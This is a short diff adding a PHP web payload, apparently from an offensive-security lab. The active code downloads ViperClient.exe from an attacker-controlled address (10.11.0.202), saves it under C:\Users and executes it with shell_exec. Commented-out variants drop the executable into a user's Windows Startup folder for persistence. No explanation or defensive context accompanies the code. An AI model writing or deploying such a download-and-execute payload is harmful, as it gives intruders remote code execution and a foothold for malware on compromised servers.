@@ -1,0 +1,9 @@
+<pre style="text-align:left;">
+<?php
+	//file_put_contents("C:\Users\Offsec\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ViperClient.exe", fopen("http://10.11.0.202/ViperClient.exe", 'r'));
+	//echo shell_exec("C:\Users\Offsec\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ViperClient.exe");
+	file_put_contents("C:\Users\ViperClient.exe", fopen("http://10.11.0.202/ViperClient.exe", 'r'));
+	echo shell_exec("C:\Users\ViperClient.exe");
+
+?>
+</pre>
